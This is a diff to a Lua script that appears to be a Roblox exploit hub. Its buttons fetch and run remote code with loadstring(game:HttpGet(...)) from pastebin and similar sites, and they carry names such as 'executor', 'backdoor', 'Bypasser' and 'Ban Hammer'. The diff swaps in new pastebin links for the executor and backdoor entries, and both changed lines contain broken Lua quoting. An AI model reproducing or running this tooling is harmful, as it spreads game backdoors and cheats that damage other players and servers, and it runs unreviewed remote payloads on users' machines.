@@ -122,7 +122,7 @@ end
 -- Original 25 buttons
 local originalButtons = {
     {Name='Axur Bypasser v2', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Axur-Bypasser-V2-48316'))()"},
-    {Name='c00lk1ng executor', Script="loadstring(game:HttpGet('https://pastebin.com/raw/LbD9PVE7'))()"},
+    {Name='L0OLKIDD0 executor', Script="loadstring(game:HttpGet("https://pastebin.com/raw/iGCRYy1A"))()"},
     {Name='Ban Hammer', Script="loadstring(game:HttpGet('https://pastebin.com/raw/zGhJpZcg'))()"},
     {Name='Server Admin', Script="loadstring(game:HttpGet('https://raw.githubusercontent.com/gObl00x/Pendulum-Fixed-AND-Others-Scripts/refs/heads/main/Server%20Admin'))()"},
     {Name='Caducus', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Caducus-the-fallen-god-script-53019'))()"},
@@ -137,7 +137,7 @@ local originalButtons = {
     {Name='FE John Doe', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-John-Doe-Script-46855'))()"},
     {Name='Grab Knife', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753'))()"},
     {Name='suicide gun', Script="loadstring(game:HttpGet('https://pastefy.app/xxRyJ8xN/raw'))()"},
-    {Name='c00lk1ng backdoor', Script="loadstring(game:HttpGet('https://pastebin.com/raw/Fgj8UHVA'))()"},
+    {Name='L0OLKIDD0 backdoor', Script="loadstring(game:HttpGet("https://pastebin.com/raw/pyxmE9KF"))()"},
     {Name='Xester-v1', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Xester-V1-46145'))()"},
     {Name='Xester-Astra', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Xester-astra-44171'))()"},
     {Name='Xester-Monster', Script="loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Roblox-VEREUS-monster-script-3746'))()"},
